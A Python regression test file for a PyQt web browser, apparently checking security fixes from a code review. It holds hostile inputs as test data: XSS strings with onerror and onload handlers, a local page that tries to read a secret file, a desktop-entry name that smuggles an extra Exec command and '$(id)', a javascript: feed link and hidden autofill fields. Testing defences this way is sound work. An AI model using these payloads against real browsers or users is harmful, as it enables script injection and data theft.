"""Bugs found by the 2026-11 line-by-line review, one check each.

Plain functions of browser.py where possible, so most of this needs no
window. Nothing here touches your data (see harness.boot)."""
import json, sys
import time as _time
import harness as H

B = H.boot()
RESULTS = []


def check(name, cond, extra=""):
    RESULTS.append((bool(cond), name))
    print(("  ok   " if cond else "  FAIL ") + name
          + (("  <%s>" % (extra,)) if extra else ""))

def jsq(view, code, world=None):
    """H.js inside a wait: a page too busy to answer this time is a
    "not yet", not a crash of the whole suite (H.js raises on timeout)."""
    try:
        return H.js(view, code, world)
    except AssertionError:
        return None



# -- the bar's calculator: a power of a power must not blow up ----------
for expr in ("((9^64)^64)^2", "(((9^64)^64)^64)", "(9^64)^64"):
    try:
        got = B._calc_answer(expr)
        check("calc %s answers or declines without raising" % expr,
              got is None or isinstance(got, tuple), got)
    except Exception as e:
        check("calc %s answers or declines without raising" % expr,
              False, repr(e)[:80])
check("calc still does 12*64", B._calc_answer("12*64") == ("= 768", "768"))
check("calc still does 2^10", B._calc_answer("2^10") == ("= 1024", "1024"))

# -- a bad debug port in the config must not stop the start ---------------
for bad in ("abc", 99999, [1], -5):
    B.CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
    B.CONFIG_FILE.write_text(json.dumps({"debugPort": True,
                                         "debugPortNumber": bad}))
    try:
        flags = B._startup_flags()
        check("debugPortNumber=%r still starts" % (bad,),
              "--remote-debugging-port=9222" in flags, flags)
    except Exception as e:
        check("debugPortNumber=%r still starts" % (bad,), False, repr(e)[:80])
B.CONFIG_FILE.write_text(json.dumps({"debugPort": True,
                                     "debugPortNumber": 9333}))
check("a good debug port is kept",
      "--remote-debugging-port=9333" in B._startup_flags())
B.CONFIG_FILE.unlink()

# -- a VS Code theme with short colours imports them, not Mocha's -------
got = B.kitty_colours(json.dumps({"colors": {
    "editor.background": "#123", "editor.foreground": "#ffffffcc",
    "focusBorder": "#zzzzzz", "button.background": "#0a0B0c"}}))
check("VS Code import: #rgb becomes #rrggbb", got.get("bg") == "#112233", got)
check("VS Code import: alpha dropped", got.get("text") == "#ffffff", got)
check("VS Code import: a bad colour is skipped for the next name",
      got.get("accent") == "#0a0b0c", got)

# -- a vault key that never reached the disk is not handed out -----------
import tempfile as _tempfile
from pathlib import Path as _Path
_kdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_real_atomic = B._write_atomic
B._write_atomic = lambda path, data: False      # the disk says no
try:
    lock = B.VaultLock(_kdir)
    got = lock._plain_key()
    check("vault key: an unwritten key is not used", got is None, got)
    check("vault key: and no half file is left",
          not (_kdir / "passwords.key").exists())
finally:
    B._write_atomic = _real_atomic
lock = B.VaultLock(_kdir)
k1 = lock._plain_key()
check("vault key: a written key is 32 bytes and on disk",
      k1 is not None and len(k1) == 32
      and (_kdir / "passwords.key").read_bytes() == k1)
check("vault key: and stays the same next time", lock._plain_key() == k1)

# -- switching the master password off never writes {} over a vault -----
_mdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
ml = B.VaultLock(_mdir)
ml.write({"items": [{"host": "x", "password": "keep-me"}]})
check("master: switched on", ml.enable("correct horse battery"))
raw = (_mdir / "passwords.json").read_bytes()
(_mdir / "passwords.json").write_bytes(raw[:-1] + bytes([raw[-1] ^ 1]))
check("master: off is refused while the body does not open",
      ml.disable() is False)
check("master: and the vault is still the sealed one",
      (_mdir / "passwords.json").read_bytes()[:4] == B.MASTER_MAGIC)
(_mdir / "passwords.json").write_bytes(raw)
check("master: off works on a sound vault", ml.disable() is True)
check("master: with everything still in it",
      "keep-me" in json.dumps(B.VaultLock(_mdir).read()))

# -- 1Password: an id that is really an option never reaches op ----------
opp = B.OnePasswordProvider(_kdir)
ran = []
opp._run = lambda args, want_json=True, stdin=None: (ran.append(args)
                                                     or (False, "x"))
for bad in ("--vault=other", "-h", "a b", ""):
    opp.details(bad); opp.totp(bad); opp.delete(bad)
    opp.put({"id": bad or "-", "remote": True, "type": "login"})
check("1Password: option-shaped ids never run op",
      not [a for a in ran if a[:2] in (["item", "get"], ["item", "delete"],
                                       ["item", "edit"])], ran[:3])
opp.details("abc123")
check("1Password: a real id still does", ran and ran[-1][2] == "abc123", ran)

# -- one junk number in a vault row must not stop the vault loading -------
for d in ({"items": [{"used": "abc"}]}, {"entries": [{"host": "x.com",
                                                      "used": "zz"}]},
          {"items": [{"history": [{"password": "a", "when": "x"}]}]},
          {"version": "new"}, {"items": [{"type": "apikey",
                                          "expires": "soon"}]}):
    try:
        got = B.PasswordVault.migrate(d)
        check("vault migrate survives %r" % (d,), isinstance(got, dict))
    except Exception as e:
        check("vault migrate survives %r" % (d,), False, repr(e)[:60])

# -- a malformed Bitwarden export is read as far as it goes, never raises -
_bdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
bv = B.PasswordVault(_bdir)
odd = {"items": [{"type": [1], "name": "a.example",
                  "login": {"uris": {"0": "x"}, "password": "p1"}},
                 {"type": 1, "name": "b.example", "fields": "nope",
                  "login": {"uris": [{"uri": "https://b.example/"}],
                            "username": "me", "password": "p2"}}]}
try:
    n = bv.import_bitwarden(json.dumps(odd))
    check("Bitwarden import: odd rows do not raise, good rows land", n == 2,
          n)
except Exception as e:
    check("Bitwarden import: odd rows do not raise, good rows land", False,
          repr(e)[:80])

# -- our own CSV export comes back through "import a file" unchanged ------
_cdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
cv = B.PasswordVault(_cdir)
cv.set_entry("c.example", "https", "me", "=SUM(1)")
cv.set_entry("d.example", "https", "you", "plain")
import csv as _csv, io as _io
buf = _io.StringIO()
_csv.writer(buf).writerows(cv.export_rows())
cv2 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
cv2.import_rows(buf.getvalue())
got = {(e["host"], e["password"]) for e in cv2.logins()}
check("CSV round trip: a formula-looking password survives",
      ("c.example", "=SUM(1)") in got, got)
check("CSV round trip: a plain one too", ("d.example", "plain") in got, got)

# -- the updater's "set my changes aside" keeps every file ----------------
import subprocess as _sp
_repo = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_g = lambda *a: _sp.run(["git", *a], cwd=str(_repo), capture_output=True)
_g("init", "-q"); _g("config", "user.email", "t@example.invalid")
_g("config", "user.name", "t")
(_repo / "a.txt").write_text("one")
(_repo / "b c.txt").write_text("two")
_g("add", "."); _g("commit", "-qm", "x")
(_repo / "a.txt").write_text("one EDITED")          # " M a.txt", first line
(_repo / "b c.txt").write_text("two EDITED")
(_repo / "\u00fc.txt").write_text("untracked umlaut")
_real_app = B.APP_DIR
B.APP_DIR = _repo
try:
    sub = B.Bridge(None)._stash_uncommitted()
finally:
    B.APP_DIR = _real_app
saved = _repo / (sub or "missing")
check("updater stash: it went ahead", bool(sub), sub)
check("updater stash: the first edited file is kept",
      (saved / "a.txt").exists() and
      (saved / "a.txt").read_text() == "one EDITED")
check("updater stash: a name with a space is kept",
      (saved / "b c.txt").exists())
check("updater stash: an untracked umlaut name is kept",
      (saved / "\u00fc.txt").exists())

# -- the Minecraft ping never raises, whatever the server sends ---------
import socket as _socket, threading as _threading


def _fake_mc(answer):
    srv_sock = _socket.socket()
    srv_sock.bind(("127.0.0.1", 0))
    srv_sock.listen(1)

    def serve():
        c, _ = srv_sock.accept()
        try:
            c.recv(4096)
            body = json.dumps(answer).encode()
            pkt = b"\x00" + B._varint(len(body)) + body
            c.sendall(B._varint(len(pkt)) + pkt)
        finally:
            c.close()
            srv_sock.close()
    _threading.Thread(target=serve, daemon=True).start()
    return srv_sock.getsockname()[1]


for answer in ([], 7, {"players": "lots"}, {"players": {"online": "x"}},
               {"description": {"extra": 5}}, {"version": "1.21"}):
    port = _fake_mc(answer)
    try:
        got = B.mc_ping("127.0.0.1", port, timeout=2)
        check("mc_ping survives %r" % (answer,), isinstance(got, dict), got)
    except Exception as e:
        check("mc_ping survives %r" % (answer,), False, repr(e)[:80])
port = _fake_mc({"players": {"online": 3, "max": 20},
                 "version": {"name": "1.21"}, "description": "hi"})
got = B.mc_ping("127.0.0.1", port, timeout=2)
check("mc_ping still reads a real answer",
      got.get("up") and got.get("players") == 3 and got.get("motd") == "hi",
      got)

# -- page-controlled text in a message box renders as itself --------------
from PyQt6.QtGui import QTextDocument as _QTD
_doc = _QTD()
_raw = '<font size=1>tiny</font> & "x"\nline two.user.js'
_doc.setHtml(B.literal(_raw))
check("literal(): markup comes out as the characters typed",
      _doc.toPlainText().replace("\u2029", "\n") == _raw,
      repr(_doc.toPlainText()))
import ast as _ast
_tree = _ast.parse(open(B.__file__, encoding="utf-8").read())
_plugin = [n for n in _ast.walk(_tree) if isinstance(n, _ast.Call)
           and getattr(n.func, "attr", "") == "question"
           and any(isinstance(a, _ast.Constant) and a.value == "Install plugin?"
                   for a in n.args)]
check("the install-plugin question wraps its page-made text",
      _plugin and isinstance(_plugin[0].args[2], _ast.Call)
      and getattr(_plugin[0].args[2].func, "id", "") == "literal")

# -- window-level checks ---------------------------------------------------
app = H.app()
srv = H.Server({
    "/urltext": "<title>u</title><p id=t>see https://a.example/x and "
                "&lt;img src=x onerror=&quot;window.pwned=1&quot;&gt; too</p>",
    "/boldtext": "<title>b</title><p id=t>Hello reader "
                 "&lt;img src=x onerror=&quot;window.pwned2=1&quot;&gt; "
                 "a&lt;i&gt;b</p>",
    "/code": "<title>c</title><pre id=c>// a comment \"quoted\" 42\n"
             "var s = \"text\"; x = f(3); # hash &lt;b&gt;</pre>",
    "/drafts": "<title>d</title><input id=n name=note>"
               "<input id=cc name=card autocomplete=cc-number>",
    "/quoteid": "<title>q</title><input id='a\"b'><label for='x'>x</label>"
                "<input id=x>",
    "/repo/blob/main/README.md": "<title>gh</title><nav id=site>menu</nav>"
                                 "<article id=readme><h1>Hi</h1></article>",
    "/timers": "<title>t</title><script>window.ticks=0;"
                "setInterval(function(){window.ticks++},20)</script>",
    "/drive-torrent": "<title>dt</title><script>"
                      "location.href='/files/thing.torrent'</script>",
    "/drive-meta": "<title>dm</title><meta http-equiv=refresh "
                   "content='0;url=/files/meta.torrent'>",
    "/twhome": "<title>tw</title><p>home</p>",
    # an article the reader recognises: the README page above has no
    # paragraphs, so the reader answered "no article" there
    "/art96": "<title>art</title><nav>menu menu menu</nav><article>"
              + "".join("<p>Paragraph %d of the article, long enough "
                        "for the reader to count it as text.</p>" % i
                        for i in range(12)) + "</article>",
    "/pwform": "<title>pw</title><input id=u><input id=p type=password>",
    "/vid": "<title>v</title><video id=v></video>",
    "/pinned": "<title>pin</title><div id=h style='position:fixed;top:0'>x</div>"
               "<div style='height:3000px'></div>",
    "/links": "<title>l</title><p><a href=/twhome>a</a> <a href=/timers>b</a></p>",
    "/fakeplayer": "<title>fp</title><script>window.__playerLoad = function (x)"
                   " { window.__got = x; return 1; };</script>",
    "/signup": "<title>su</title><input id=u name=username autocomplete=username>"
               "<input id=e name=email type=email><input id=n name=fullname>",
    "/shorts/abcdef": "<title>sh</title><p>a story</p>",
    "/bands": "<title>bands</title><style>body{margin:0}div{height:100px}"
              "div:nth-child(odd){background:#ff0000}"
              "div:nth-child(even){background:#0000ff}</style>"
              + "<div></div>" * 300,
    "/formhist": "<title>fh</title><input id=c name=city>",
    "/accepts": "<title>acc</title><script>window.__clicked=[];</script>"
                "<button aria-label='Accept friend request'"
                " onclick=\"__clicked.push('friend')\">ok</button>"
                "<div id=cookie-banner><button aria-label='Accept all'"
                " onclick=\"__clicked.push('banner')\">ok</button></div>",
    "/zoomtext": "<title>z</title><style>body{font-size:16px}h1{font-size:32px}"
                 "h2{font-size:24px}</style><p id=p>text <span id=in>inner</span>"
                 "</p><h1 id=h1>H</h1><h2 id=h2>h</h2>",
    "/chatpage": "<title>c</title><div class=chat-line id=c1>a spoiler here</div>"
                 "<div class=chat-line id=c2>hello</div>",
    "/adpage": "<title>ad</title><p class=good id=g>ad</p><p id=n>text</p>",
    "/hooked": "<title>h</title><script>window.__seen=[];"
               "var o=String.prototype.toLowerCase;"
               "String.prototype.toLowerCase=function(){"
               "window.__seen.push(String(this));return o.call(this)};"
               "</script><p id=w>zz Qwsecretname zz</p><p>hello</p>",
    "/feedjs.xml": b"<rss><channel><title>F</title>"
                   b"<item><title>bad</title><link>javascript:alert(1)</link></item>"
                   b"<item><title>good</title><link>https://ok.example/1</link></item>"
                   b"</channel></rss>",
    "/twother": "<title>other</title><p id=other>somewhere else</p>",
    "/sneaky": "<title>s</title><form>"
               "<input id=full name=fullname autocomplete=name>"
               "<input id=mail name=email type=email>"
               "<input id=street name=street autocomplete=street-address "
               "style='position:absolute;left:-9999px'>"
               "<input id=tel name=phone type=tel style='opacity:0'>"
               "<input id=zip name=zip autocomplete=postal-code "
               "style='width:1px;height:1px;padding:0;border:0'>"
               "<div style='height:0;overflow:hidden'>"
               "<input id=city name=city autocomplete=address-level2></div>"
               "<div style='opacity:0'><input id=country name=country "
               "autocomplete=country-name></div>"
               "</form>",
    "/checkout2": "<title>c2</title><form>"
                  "<textarea id=msg></textarea>"
                  "<input id=num name=cardnumber>"
                  "<input name=cvc placeholder=CVC>"
                  "<label for=ib>IBAN</label><input id=ib>"
                  "<input name=otp_code>"
                  "<textarea class=t1></textarea>"
                  "<textarea class=t2></textarea></form>",
    "/auth/panel": "<title>panel</title><p>you are in</p>",
    "/blockme": "<title>bm</title><p id=b>served</p>",
    "/twovids": "<title>tv</title><script>"
                "var a=document.createElement('video');a.id='same';"
                "a.src='/clip.webm';document.documentElement.appendChild(a);"
                "var b=document.createElement('video');b.id='other';"
                "b.src=location.protocol+'//localhost:'+location.port"
                "+'/clip.webm';document.documentElement.appendChild(b)"
                "</script>",
    "/fr": "<html lang=fr><title>fr</title><p>Bonjour tout le monde, ceci "
           "est une page en fran\u00e7ais pour le test.</p></html>",
    "/tpframe": "<title>tp</title><script>window.got=null;"
                "addEventListener('message',function(e){window.got=e.data});"
                "var f=document.createElement('iframe');f.src=location.protocol"
                "+'//localhost:'+location.port+'/tpset';"
                "document.body?document.body.appendChild(f):"
                "document.documentElement.appendChild(f)</script>",
    "/tpset": "<script>document.cookie='tp=1; path=/';"
              "parent.postMessage(document.cookie,'*')</script>",
    "/vidfile": "<title>v</title><video src='file:///etc/hostname'></video>",
    "/notif": "<title>n</title><script>window.asked='';"
              "Notification.requestPermission().then(function(r){"
              "window.asked=r})</script>",
    "/setck": "<title>ck</title><script>document.cookie='srv=1; path=/'"
              "</script>",
    "/privck": "<title>pk</title><script>document.cookie="
               "'privonly_review=1; path=/'</script>",
    "/imgauth": "<title>i</title><p>a page with a frame</p><script>"
                "var i=document.createElement('iframe');"
                "i.src=location.protocol+'//localhost:'"
                "+location.port+'/auth/panel';"
                "document.body.appendChild(i)</script>"})
br = B.Browser()
# the suite's window never closes itself: a section that closes its last
# tab (with other windows open) made it leave the open-window list and
# go on working hidden -- Settings rebinds, session lookups and timer
# handling then skipped it and later sections failed for that alone
_real_etq = br._ensure_tab_or_quit


def _keep_br_open():
    real = [i for i in range(br.tabs.count())
            if not br._is_header(br.tabs.widget(i))]
    if not real:
        br.new_tab(group=None)
        return None
    return _real_etq()


br._ensure_tab_or_quit = _keep_br_open


def _close_if_open(view, win=None):
    """Close a tab a section opened, if it is still there: a tab closed
    on the way (and deleted by the time it is asked about) raised from
    indexOf and ended the whole suite."""
    win = win or br
    try:
        at = win.tabs.indexOf(view)
    except RuntimeError:
        return False
    if at >= 0:
        win.close_tab(at, ask=False)
        return True
    return False
br.show()
H.spin(300)
view = br.current()

# the request interceptor is there from the start, ad blocking or not:
# blocked addresses, his headers, the per-site agent and Sec-GPC all
# live in it
H.spin(300)
check("the request interceptor is in place at start-up",
      getattr(br, "_req_watch", None) is not None)

# a local .html cannot read the files beside it
_fdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_fdir / "secret.txt").write_text("TOPSECRET")
(_fdir / "evil.html").write_text(
    "<script>var x=new XMLHttpRequest();try{x.open('GET','secret.txt',"
    "false);x.send();window.got=x.responseText}catch(e){"
    "window.got='blocked'}</script>")
H.load(view, B.QUrl.fromLocalFile(str(_fdir / "evil.html")).toString())
H.spin(1500)
check("a local page cannot read another local file",
      H.js(view, "window.got") != "TOPSECRET", H.js(view, "window.got"))

# an epub's chapter cannot run script in the reader
import zipfile as _zip
_book = _fdir / "evil.epub"
with _zip.ZipFile(str(_book), "w") as z:
    z.writestr("ch1.xhtml", "<html><body><h1>One</h1><p>text</p>"
               "<details open ontoggle=\"window.pwned3=1\">x</details>"
               "<svg onload=\"window.pwned4=1\"></svg></body></html>")
br.open_epub(str(_book), view=view)
H.spin(1500)
check("epub: the chapter text is there",
      "text" in (H.js(view, "document.body.innerText") or ""))
check("epub: its event handlers never run",
      H.js(view, "window.pwned3 === undefined && window.pwned4 === undefined"))

# the page menu's Freeze: the page's own timers must stop
H.load(view, srv.url("/timers"))
H.spin(500)
br.page_tool("freeze", view=view)
H.spin(300)
H.js(view, "window.later=0;setTimeout(function(){window.later=1},10);"
           "window.base=window.ticks")
H.spin(600)
check("Freeze stops the page's running interval",
      H.js(view, "window.ticks-window.base") == 0,
      H.js(view, "window.ticks-window.base"))
check("Freeze stops a timer the page sets afterwards",
      H.js(view, "window.later") == 0)
br.page_tool("thaw", view=view)
H.spin(200)
H.js(view, "window.later2=0;setTimeout(function(){window.later2=1},10)")
H.spin(300)
check("Thaw gives the page its timers back", H.js(view, "window.later2") == 1)

# clickable addresses: the page's own text must stay text
br.config["nav"] = {"clickableUrls": True}
br.refresh_nav()
H.load(view, srv.url("/urltext"))
H.spin(1500)
check("clickable URLs: the address became a link",
      H.js(view, "document.querySelectorAll('#t a.__navurl').length") == 1)
check("clickable URLs: text that looks like markup is not run",
      H.js(view, "window.pwned === undefined && "
                 "!document.querySelector('#t img')"))
check("clickable URLs: the words around it are kept",
      "onerror" in (H.js(view, "document.getElementById('t').textContent")
                    or ""))
br.config["nav"] = {}
br.refresh_nav()

# keep drafts: an ordinary box is kept, a card number is not
H.load(view, srv.url("/drafts"))
H.spin(800)
H.click(view, "#n"); H.type_text(view, "hello")
H.click(view, "#cc"); H.type_text(view, "4111111111111111")
H.spin(300)
drafts = H.js(view, "sessionStorage.getItem('__formdraft') || ''") or ""
check("drafts: the ordinary box is kept", "hello" in drafts, drafts)
check("drafts: the card number is not", "4111" not in drafts, drafts)

# bold word starts (accessibility): the page's text must stay text
br.config["a11y"] = {"boldStarts": True}
br.refresh_a11y()
H.load(view, srv.url("/boldtext"))
H.spin(1500)
check("bold starts: words got their bold start",
      (H.js(view, "document.querySelectorAll('#t b').length") or 0) >= 2)
check("bold starts: text that looks like markup is not run",
      H.js(view, "window.pwned2 === undefined && "
                 "!document.querySelector('#t img')"))
check("bold starts: the text reads the same",
      H.js(view, "document.getElementById('t').textContent")
      == 'Hello reader <img src=x onerror="window.pwned2=1"> a<i>b')
# the audit survives an input id with a quote in it
H.load(view, srv.url("/quoteid"))
H.spin(1000)
audit = H.js(view, "(function(){try{return JSON.stringify("
                   "window.__a11yAudit())}catch(e){return 'threw '+e}})()",
             B.APP_WORLD_ID)
check("a11y audit survives a quote in an id",
      bool(audit) and not str(audit).startswith("threw"), audit)
br.config["a11y"] = {}
br.refresh_a11y()

# code highlighting: colours only, the code itself unchanged
H.load(view, srv.url("/code"))
H.spin(800)
before = H.js(view, "document.getElementById('c').textContent")
br.read_page_tool("highlight", view=view)
H.spin(500)
after = H.js(view, "document.getElementById('c').textContent")
check("highlight: coloured something",
      (H.js(view, "document.querySelectorAll('#c span').length") or 0) > 0)
check("highlight: the code reads exactly as before", before == after,
      repr(after)[:160])

# private tabs: never bookmarked by "bookmark all", never lost by "aside"
H.load(view, srv.url("/timers"))
pv2 = br.new_private_tab()
H.load(pv2, srv.url("/urltext"))
H.spin(800)
before = len(br.bookmarks)
br.bookmark_all_tabs()
check("bookmark all tabs skips the private one",
      not any("/urltext" in (e.get("url") or "") for e in br.bookmarks),
      [e.get("url") for e in br.bookmarks[before:]])
br.set_aside()
check("putting tabs aside leaves the private tab open",
      pv2 in [v for _i, v in br._real_tabs()])
br.close_tab(br.tabs.indexOf(pv2), ask=False)
br.bring_back_aside(0)
H.spin(300)

# a desktop entry cannot be talked into a second Exec line
_entry = br.write_desktop_entry("https://x.example/%F0?a=$(id)",
                                "Evil\nExec=sh -c touch_pwned")
_text = _Path(_entry).read_text() if _entry else ""
_execs = [l for l in _text.splitlines() if l.startswith("Exec=")]
check("desktop entry: one Exec line, the name's newline is gone",
      len(_execs) == 1 and "touch_pwned" not in _execs[0], _execs)
check("desktop entry: % doubled and $ escaped in Exec",
      "%%F0" in _execs[0] and "\\$(id)" in _execs[0], _execs)

# "forget this site" forgets that site and no other
br.history = [{"url": "https://x.com/a", "title": "x", "t": 1},
              {"url": "https://www.netflix.com/b", "title": "n", "t": 2},
              {"url": "https://sub.x.com/c", "title": "s", "t": 3}]
br.config["permissions"] = {"https://x.com:443|MediaAudioCapture": True,
                            "https://netflix.com:443|Notifications": True}
br.known_hosts = {"x.com", "netflix.com"}
br.forget_site("x.com")
left = sorted(e["url"] for e in br.history)
check("forget x.com keeps netflix.com history",
      left == ["https://www.netflix.com/b"], left)
check("forget x.com keeps netflix.com permissions",
      list(br.config["permissions"]) == ["https://netflix.com:443|Notifications"],
      br.config["permissions"])
check("forget x.com keeps netflix.com in the bar's memory",
      br.known_hosts == {"netflix.com"}, br.known_hosts)

# "clear site data" really takes the cookies away
view = br.new_tab()
H.spin(500)
H.load(view, srv.url("/timers"))
H.spin(500)
H.js(view, "document.cookie='keepme=1; path=/; max-age=3600'")
H.spin(300)
br.clear_site_data("127.0.0.1")
H.spin(2500)
_jar = H.js(view, "document.cookie") or ""
check("clear site data removes the site's cookie", "keepme" not in _jar,
      _jar)

# a page cannot drive the chrome with events it made up
br.config["vimKeys"] = True
br.config["mouse"] = {"superDrag": True, "swipeNav": True}
br.refresh_nav()
v1 = br.new_tab(); H.spin(300)
H.load(v1, srv.url("/urltext")); H.spin(900)
before_tabs = len(br._real_tabs())
H.js(v1, "['g','t'].forEach(function(k){document.dispatchEvent("
         "new KeyboardEvent('keydown',{key:k,bubbles:true}))});"
         "var a=document.querySelector('a')||document.body;"
         "a.dispatchEvent(new DragEvent('dragstart',{bubbles:true}));"
         "document.dispatchEvent(new WheelEvent('wheel',{deltaX:200,"
         "bubbles:true,cancelable:true}))")
br._gesture_tick()
H.spin(800)
check("synthetic gt does not switch his tab", br.current() is v1)
check("synthetic dragstart opens no tab",
      len(br._real_tabs()) == before_tabs, len(br._real_tabs()))
br.config["vimKeys"] = False
br.config["mouse"] = {}
br.refresh_nav()

# a bookmarklet bound to a key runs
br.bookmarks.append({"id": 99999, "type": "link", "title": "BoundOne",
                     "url": "", "js": "window.boundRan=1", "parent": 0,
                     "icon": "", "t": 1})
v2 = br.new_tab(); H.spin(300)
H.load(v2, srv.url("/timers")); H.spin(600)
check("a bookmarklet bound to a key runs",
      br.run_bound_script("BoundOne", view=v2) is True)
H.spin(300)
check("...and really ran in the page", H.js(v2, "window.boundRan") == 1)
br.bookmarks = [b for b in br.bookmarks if b.get("id") != 99999]

# a private tab leaves no places behind in the config
pv3 = br.new_private_tab(); H.spin(300)
H.load(pv3, srv.url("/timers")); H.spin(600)
br.config["readResume"] = True
check("private: no video place is noted", br.note_media_place(pv3) is False)
check("private: no reading place is noted",
      br.note_reading_place(pv3) is False)
check("private: no pdf place is noted", br.note_pdf_place(pv3) is False)
br.config["readResume"] = False
br.close_tab(br.tabs.indexOf(pv3), ask=False)

# stopping the camera on one site revokes that site's grants only
br.config["permissions"] = {
    "https://x.com:443|MediaAudioVideoCapture": True,
    "https://netflix.com:443|MediaVideoCapture": True}
v4 = br.new_tab(); H.spin(200)
v4.url = lambda: B.QUrl("https://x.com/call")      # what the tab is on
br.stop_media_use(v4)
check("stop media: the site's own mic+camera grant is taken back",
      "https://x.com:443|MediaAudioVideoCapture" not in br.config["permissions"],
      br.config["permissions"])
check("stop media: netflix.com keeps its grant",
      "https://netflix.com:443|MediaVideoCapture" in br.config["permissions"])
del v4.url

# a trusted certificate is trusted exactly, not every certificate for the host
class _Cert:
    def __init__(self, der): self._der = der
    def toDer(self): return self._der
class _Err:
    def __init__(self, der):
        self._chain = [_Cert(der)]
    def url(self): return B.QUrl("https://printer.lan/")
    def description(self): return "self-signed"
    def isOverridable(self): return True
    def certificateChain(self): return self._chain
_ask = B.QMessageBox.question
_asked = []
B.QMessageBox.question = staticmethod(
    lambda *a, **k: (_asked.append(1), B.QMessageBox.StandardButton.Yes)[1])
try:
    br.config["certExceptions"] = {}
    check("cert: first one is asked and trusted",
          br.certificate_error(_Err(b"cert-one")) is True and len(_asked) == 1)
    check("cert: the same one again is not asked",
          br.certificate_error(_Err(b"cert-one")) is True and len(_asked) == 1)
    B.QMessageBox.question = staticmethod(
        lambda *a, **k: (_asked.append(1), B.QMessageBox.StandardButton.No)[1])
    check("cert: a DIFFERENT one for the same host is asked again",
          br.certificate_error(_Err(b"cert-two")) is False and len(_asked) == 2,
          len(_asked))
finally:
    B.QMessageBox.question = _ask
    br.config["certExceptions"] = {}

# the selection bar: a page cannot forge a press on it
br.config["readSelBar"] = True
v5 = br.new_tab(); H.spin(300)
H.load(v5, srv.url("/urltext")); H.spin(600)
br.read_page_tool("selbar", view=v5); H.spin(300)
from PyQt6.QtGui import QGuiApplication as _QGA
_QGA.clipboard().setText("mine")
H.js(v5, "window.__selWanted={what:'copy',text:'attacker-text'};"
         "var b=document.querySelector('button[data-what=copy]');"
         "if(b)b.dispatchEvent(new MouseEvent('mousedown',{bubbles:true}))")
br._selection_bar_tick(); H.spin(600)
check("selection bar: a page cannot set the clipboard through it",
      _QGA.clipboard().text() == "mine", _QGA.clipboard().text())
br.config["readSelBar"] = False

# the window lock: nothing runs behind it, and it covers the whole window
br.show(); br.new_tab(); H.spin(400)      # earlier blocks closed tabs
br.set_browser_lock("open sesame")
check("locked: the lock goes up", br.lock_browser() and br.locked_now())
H.spin(200)
br._guarded_run("history", br.toggle_history)()
H.spin(500)
check("locked: a shortcut does not open a pane over the lock",
      not br.pane_open(), str(br.pane_open()))
br.resize(br.width() + 200, br.height() + 120); H.spin(300)
_cov = br._lock_cover
check("locked: still locked after the shortcut", _cov is not None)
check("locked: the cover follows the window size",
      _cov is not None and _cov.geometry() == br.rect(),
      str((_cov.geometry() if _cov else None, br.rect())))
br.unlock_browser()
br._guarded_run("history", br.toggle_history)()
H.spin(500)
check("unlocked (control): the same shortcut does open the pane",
      br.pane_open(), str((br.isVisible(), br._pane and br._pane.name,
                           br._pane and br._pane.isVisible())))
br.set_browser_lock("")
br.close_pane()

# a private tab's notification is not written into the config
class _Note:
    def origin(self): return B.QUrl("https://chat.example/")
    def title(self): return "secret title"
    def message(self): return "secret body"
    def show(self): pass
    def close(self): pass
br.config["notifyLog"] = []
br.config["desktopNotify"] = False
br._web_notification(_Note(), private=True)
check("private notification: nothing in the log",
      not br.config.get("notifyLog"), br.config.get("notifyLog"))
br._web_notification(_Note())
check("normal notification: still logged",
      len(br.config.get("notifyLog") or []) == 1)
br.config["notifyLog"] = []

# a web page whose address ends in .md is a web page, not a file to render
v6 = br.new_tab(); H.spin(300)
H.load(v6, srv.url("/repo/blob/main/README.md")); H.spin(1500)
check("an HTML page at a .md address keeps its own markup",
      H.js(v6, "!!document.getElementById('site') && "
               "!!document.getElementById('readme')"))

# saving subtitles twice keeps both files (into a scratch folder: the
# harness does not move the download folder, and his is not ours)
br.config["downloadDir"] = str(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_rows = [{"t": 1, "e": 2, "text": "one"}]
_a = br.save_subtitles(_rows)
_b = br.save_subtitles(_rows)
check("a second export does not replace the first",
      _a and _b and _a != _b and _Path(_a).exists() and _Path(_b).exists(),
      str((_a, _b)))
for _f in (_a, _b):
    try:
        _Path(_f).unlink()
    except OSError:
        pass

# a page cannot hand an address to another program by itself: a script's
# location.href or a meta refresh to a .torrent has to be asked about
_handed, _asked, _answer = [], [], [False]
br._torrent_program = lambda: "/bin/true"
br._ts3_program = lambda: "/bin/true"
br.torrent_handoff = lambda u: (_handed.append(str(u)), True)[1]
br.ts3_open = lambda u: (_handed.append(str(u)), True)[1]
br._ask_handoff = lambda kind, target, site, shown_site=None: (
    _asked.append((kind, site)), _answer[0])[1]
br.config["handoffSites"] = {}
v7 = br.new_tab(); H.spin(300)
H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
check("a script's .torrent does not start the torrent client by itself",
      not _handed, str(_handed))
check("...the page has to ask",
      _asked == [("torrent", "127.0.0.1")], str(_asked))
del _asked[:]
_answer[0] = True
H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
check("a yes hands it over",
      len(_handed) == 1 and _handed[0].endswith("/files/thing.torrent"),
      str(_handed))
check("...and is not remembered without the tick",
      not br.config.get("handoffSites"), str(br.config.get("handoffSites")))
del _handed[:], _asked[:]
_answer[0] = False
br.config["handoffSites"] = {"torrent@127.0.0.1": True}
H.load(v7, srv.url("/drive-meta")); H.spin(2000)
check("a site he always allows is not asked again",
      len(_handed) == 1 and not _asked, str((_handed, _asked)))
br.config["handoffSites"] = {}
del _handed[:], _asked[:]
v7.load(B.QUrl(srv.url("/files/typed.torrent"))); H.spin(1000)
check("an address the browser itself loads is not asked about",
      len(_handed) == 1 and not _asked, str((_handed, _asked)))
for _name in ("_torrent_program", "_ts3_program", "torrent_handoff",
              "ts3_open", "_ask_handoff"):
    br.__dict__.pop(_name, None)

# the multistream grid is built once, not over every later page
br.MULTISTREAM_HOME = srv.url("/twhome")
v9 = br.multistream(["abcd"])
